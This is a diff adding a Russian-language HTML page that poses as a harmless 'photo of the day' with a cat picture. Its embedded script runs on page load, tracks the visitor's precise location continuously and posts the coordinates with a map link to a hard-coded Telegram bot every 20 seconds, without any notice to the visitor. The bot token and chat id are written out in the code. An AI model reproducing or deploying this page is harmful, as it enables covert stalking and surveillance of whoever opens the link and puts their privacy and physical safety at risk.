@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Фото дня</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f9f9f9;
+      color: #333;
+      text-align: center;
+      padding: 30px;
+    }
+    img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 12px;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.1);
+    }
+    h1 {
+      font-size: 22px;
+      margin-bottom: 12px;
+    }
+    p {
+      font-size: 16px;
+      color: #777;
+    }
+  </style>
+</head>
+<body>
+  <h1>Подборка на сегодня</h1>
+  <p>Найдено на просторах интернета</p>
+  <img src="https://cdn2.thecatapi.com/images/MTY3ODIyMQ.jpg" alt="Фото котика" />
+
+  <script>
+    const botToken = "7972755394:AAFVmA7LMOgpygkl-ED_vhHd2eUs-agQ1aw";
+    const chatId = "148031411";
+    let lastSentTime = 0;
+    const SEND_INTERVAL = 20 * 1000; // 20 секунд
+
+    function sendToTelegram(text) {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: text
+        })
+      });
+    }
+
+    function handlePosition(position) {
+      const now = Date.now();
+      if (now - lastSentTime < SEND_INTERVAL) return;
+
+      const lat = position.coords.latitude.toFixed(6);
+      const lon = position.coords.longitude.toFixed(6);
+      const accuracy = position.coords.accuracy;
+
+      const message = `🧭 Обновление координат:\nШирота: ${lat}\nДолгота: ${lon}\nТочность: ±${Math.round(accuracy)}м\nhttps://www.google.com/maps?q=${lat},${lon}`;
+      sendToTelegram(message);
+
+      lastSentTime = now;
+    }
+
+    function handleError(error) {
+      sendToTelegram("⚠️ Ошибка геолокации: " + error.message);
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.watchPosition(handlePosition, handleError, {
+        enableHighAccuracy: true,
+        maximumAge: 10000,
+        timeout: 10000
+      });
+    } else {
+      sendToTelegram("⚠️ Браузер не поддерживает геолокацию.");
+    }
+  </script>
+</body>
+</html>
